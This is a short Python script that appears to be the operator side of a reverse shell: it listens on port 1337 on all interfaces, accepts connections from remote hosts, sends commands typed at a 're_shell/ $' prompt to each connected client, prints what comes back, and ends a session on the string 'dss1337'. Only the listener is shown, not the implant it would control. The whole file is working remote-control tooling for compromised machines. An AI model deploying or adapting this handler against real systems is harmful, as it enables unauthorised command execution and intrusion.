import socket
import threading

def recv_data(client_socket):
	recv_len = 1
	response = b""
	while recv_len:
		data	 = client_socket.recv(1024)
		recv_len = len(data)
		response += data

		if recv_len < 1024:
			break
	return response

def handler_client(client_socket):
	while True:
		cmd = ""
		while cmd == "":
			cmd = input("re_shell/ $ ")
		# Send command to client
		client_socket.send(cmd.encode("ascii"))
		# Receive result
		cmd_out = recv_data(client_socket)
		# Close session
		if cmd_out == b"dss1337":
			print("[*] Client socket closed")
			client_socket.close()
			break
		print(cmd_out.decode("ascii"))


bind_ip = "0.0.0.0"
bind_port = 1337

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((bind_ip, bind_port))
client = server.listen(1)

print(f"[*] Server Started\n[*] Server listening on {bind_ip}:{bind_port}")

while True:
	client, addr = server.accept()
	print(f"[*] Accept connection from {addr[0]}:{addr[1]}\n\n")

	client_thread = threading.Thread(target=handler_client, args=[client])
	client_thread.start()